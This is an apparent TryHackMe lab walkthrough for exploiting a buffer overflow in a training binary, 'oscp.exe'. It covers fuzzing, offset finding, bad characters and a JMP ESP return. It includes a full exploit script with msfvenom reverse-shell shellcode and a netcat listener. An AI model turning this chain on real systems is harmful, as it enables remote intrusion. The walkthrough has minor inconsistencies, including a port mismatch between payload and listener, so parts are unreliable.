# Using Immunity Debugger

1. Run Kali VM connected to THM over VPN. 
2. Start the Room Machine and note the IP address. Remote desktop from your Kali VM to the IP address of the 
Machine using Remmina. 

```text
xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea
```

## Start Immunity

| ![First run Immunity](/_static/images/overflow1a.png) |
|:--:|
| Immunity setup |

3. In the Machine, right-click the `Immunity Debugger` icon on the Desktop and choose `Run as administrator`. 
4. When Immunity loads, configure mona (bottom of Immunity):

```text
!mona config -set workingfolder c:\mona\%p
```

5. Click the open file icon, or choose `File -> Open`. Navigate to the vulnerable-apps folder 
on the admin user's desktop, and then the `oscp` folder. Select the `oscp.exe` binary and open it.
6. The binary will open in a "paused" state, so click the red play icon or choose `Debug -> Run`. 
7. In a terminal window, the `oscp.exe` binary should be running, and tells us that it is listening on port `1337`.
8. On the Kali box, connect to port `1337` on `MACHINE` using netcat:

```text
nc MACHINE_IP 1337
```

9. Type "HELP" and press Enter. Note that there are 10 different OVERFLOW commands numbered 1 - 10. Type 
"OVERFLOW1 test" and press enter. The response should be "OVERFLOW1 COMPLETE". Terminate the connection.

## Fuzzing the program

To fuzz the `ospc.exe` program to see if it is vulnerable, send it a long string of characters. This long string of 
characters will eventually exceed the memory buffer causing the buffer overflow. Use the script below and adapt it 
with the IP address of the host and the overflow to target. 

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)

```

Make sure `ospc.exe` is running in Immunity Debugger, then launch the fuzzing script. 
If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note 
of the largest number of bytes that were sent.

## Creating a cyclic pattern

Finding the `EIP` offset requires creating a pattern with the length that was required to crash the program. For 
example, by using Metasploit and adding 400 bytes to the 2000 that crashed the server:

```text
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
```

Edit the python payload below and add the cyclic pattern to the payload variable:

```python
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except socket.error:
  print("Could not connect.")

```

Name it `exploit.py` and launch it.

```text
python3 exploit.py
```

After the Python exploit crashed the script, go to the Immunity debugger and run the `mona` command to find the EIP 
offset:

```text
!mona findmsp -distance 2000
```

This should open the Log window. If it does not then open it manually and look for the following entry in the output.

```text
EIP contains normal pattern : ... (offset 1978)
```

Update the `exploit.py` script and set the offset variable to this value (was previously set to 0). Set the payload 
variable to an empty string again. Set the `retn` variable to `BBBB`.

Restart `oscp.exe` in Immunity and run the modified `exploit.py` script again. The `EIP` register should now be 
overwritten with the 4 B's (e.g. `42424242`).

## Finding bad characters

Bad characters are unwanted characters that break the shellcode. 
For Buffer Overflows to be successful we have to make sure payloads do not contain any bad characters (badchars). 
Badchars such as null bytes (`\x00`) could cause a payload to crash the program rather than executing the code 
specified.

```text
!mona bytearray -b "\x00"
```

To use Mona to create a Byte Array to compare the payload to, create a Byte Array which will exclude all the badchars 
found, starting with the Null Byte. To create a byte array to use as a payload:

```text
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Name it, run it, and paste the results as payload in the `exploit.py` script.

Reopen and run the vulnerable `oscp.exe` application in Immunity Debugger. Then run the exploit script. 

When the script has completed, go back to the Immunity Debugger and look for the `ESP` register in the `CPU` window.

Right-click the `ESP` register, copy the address to the clipboard, then run the following mona command to compare it 
to the Byte Array that Mono created earlier:

```text
!mona compare -f C:\mona\oscp\bytearray.bin -a 01AFFA30
```

This produces a window containing all the bad characters that need to eliminated from our script. 

Note that some of these characters may not be bad characters. For example `\x07` could be bleeding into `\x08` and 
making it look bad. The process must be repeated for each "bad character". 

### \x00

1. Create byte array

```text
!mona bytearray -b "\x00"
```

2. Remove byte from payload string
3. Run 
4. Get ESP address 
5. Compare the hex dump with characters sent

```text
!mona compare -f C:\mona\oscp\bytearray.bin -a 018BFA30
```

### \x00\x07

1. Create byte array

```text
!mona bytearray -b "\x00\x07"
```

2. Remove `\x07` byte from payload string
3. Run
4. Get ESP address
5. Compare the hex dump with characters sent

```text
!mona compare -f C:\mona\oscp\bytearray.bin -a 019AFA30
```

### \x00\x07\x2e

1. Create byte array

```text
!mona bytearray -b "\x00\x07\x2e"
```

2. Remove `\x2e` byte from payload string
3. Run
4. Get ESP address
5. Compare the hex dump with characters sent

```text
!mona compare -f C:\mona\oscp\bytearray.bin -a 019AFA30
```

Keep rinsing until the comparison results status returns `Unmodified`. This indicates that no more badchars are 
present. The results window now looks like:

| ![First run Immunity](/_static/images/overflow1b.png) |
|:--:|
| No badchars left |

## Finding the jump point

When an access violation occurs, the `ESP` register points to memory which contains the data which was sent to the 
application. JMP ESP Instruction is used to redirect the code execution to that location. To find the JMP ESP, 
use a module of mona with `–cpb` option and all the bad characters found earlier, to prevent mona returning a memory 
pointer with badchars.

With all badchars identified, to use Mona to find a jump point in the application:

```text
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
```

## Generate payload

Use msfvenom to create the payload:

```text
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
```

## Endianness

There are two ways by which a computer stores multibyte data types like int and float, these two types are known 
as Little Endian and Big Endian. `x86` is known as Little Endian architecture. In this architecture, the last byte 
of the binary is stored first. In Big Endian, the exact opposite happens: The first byte of the binary is stored 
first. When working with `x86` architecture the JMP ESP address must be converted into Little Endian format.

When adding the return address, reverse the JMP address.

## NOP-sled

A NOP-sled (No Operation sled) is a sequence of no-operation instructions which is responsible for sliding the CPU’s execution flow to 
the next memory address. Prepending `nops` before the shellcode, it does not matter where the buffer is located. 
When the return pointer hits the NOP-sled then as the name suggests it is going to slide the return address until it 
reaches the beginning of the shellcode.

NOP values are different for different CPUs. 

To create ssome space in memory for the payload to unpack itself, set the padding variable to a string of `16` or more 
`nops` (`"\x90"`) bytes:

```text
padding = "\x90" * 16
```

## Exploit

With the correct prefix, offset, return address, padding, and payload set, exploit the buffer overflow to get a 
reverse shell.

```python
#!/usr/bin/env python3
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978                            # EIP offset
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"               # Overwriting the return pointer
padding = "\x83\xec\x10"                # NOP sled 
payload = ("\xda\xd5\xba\xdb\x9b\x35\xe7\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x31\x55\x17\x03\x55\x17\x83\x36\x67\xd7\x12\x34\x70\x9a"
"\xdd\xc4\x81\xfb\x54\x21\xb0\x3b\x02\x22\xe3\x8b\x40\x66\x08"
"\x67\x04\x92\x9b\x05\x81\x95\x2c\xa3\xf7\x98\xad\x98\xc4\xbb"
"\x2d\xe3\x18\x1b\x0f\x2c\x6d\x5a\x48\x51\x9c\x0e\x01\x1d\x33"
"\xbe\x26\x6b\x88\x35\x74\x7d\x88\xaa\xcd\x7c\xb9\x7d\x45\x27"
"\x19\x7c\x8a\x53\x10\x66\xcf\x5e\xea\x1d\x3b\x14\xed\xf7\x75"
"\xd5\x42\x36\xba\x24\x9a\x7f\x7d\xd7\xe9\x89\x7d\x6a\xea\x4e"
"\xff\xb0\x7f\x54\xa7\x33\x27\xb0\x59\x97\xbe\x33\x55\x5c\xb4"
"\x1b\x7a\x63\x19\x10\x86\xe8\x9c\xf6\x0e\xaa\xba\xd2\x4b\x68"
"\xa2\x43\x36\xdf\xdb\x93\x99\x80\x79\xd8\x34\xd4\xf3\x83\x50"
"\x19\x3e\x3b\xa1\x35\x49\x48\x93\x9a\xe1\xc6\x9f\x53\x2c\x11"
"\xdf\x49\x88\x8d\x1e\x72\xe9\x84\xe4\x26\xb9\xbe\xcd\x46\x52"
"\x3e\xf1\x92\xf5\x6e\x5d\x4d\xb6\xde\x1d\x3d\x5e\x34\x92\x62"
"\x7e\x37\x78\x0b\x15\xc2\xeb\x3e\xf8\x94\x2a\x56\xfe\x24\xac"
"\x1c\x77\xc2\xc4\x72\xde\x5d\x71\xea\x7b\x15\xe0\xf3\x51\x50"
"\x22\x7f\x56\xa5\xed\x88\x13\xb5\x9a\x78\x6e\xe7\x0d\x86\x44"
"\x8f\xd2\x15\x03\x4f\x9c\x05\x9c\x18\xc9\xf8\xd5\xcc\xe7\xa3"
"\x4f\xf2\xf5\x32\xb7\xb6\x21\x87\x36\x37\xa7\xb3\x1c\x27\x71"
"\x3b\x19\x13\x2d\x6a\xf7\xcd\x8b\xc4\xb9\xa7\x45\xba\x13\x2f"
"\x13\xf0\xa3\x29\x1c\xdd\x55\xd5\xad\x88\x23\xea\x02\x5d\xa4"
"\x93\x7e\xfd\x4b\x4e\x3b\x1d\xae\x5a\x36\xb6\x77\x0f\xfb\xdb"
"\x87\xfa\x38\xe2\x0b\x0e\xc1\x11\x13\x7b\xc4\x5e\x93\x90\xb4"
"\xcf\x76\x96\x6b\xef\x52")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	print("[+] Sending evil buffer")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("[+] Done!")
except socket.error:
	print("[-] Could not connect.")
finally:
    s.close()

```

Start a netcat listener on the Kali box using the LPORT specified in the `msfvenom` command (`1337`).

```text
sudo nc -lvnp 1337
```

Restart `oscp.exe` in Immunity and run the modified `exploit.py` script again. The netcat listener should catch a 
reverse shell.

## Resources

* [A Beginner’s Guide to Buffer Overflow](https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/)
* [justinsteven/dostackbufferoverflowgood](https://github.com/justinsteven/dostackbufferoverflowgood)
* [tib3rius/pentest-cheatsheets/exploits/buffer-overflows.rst](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)

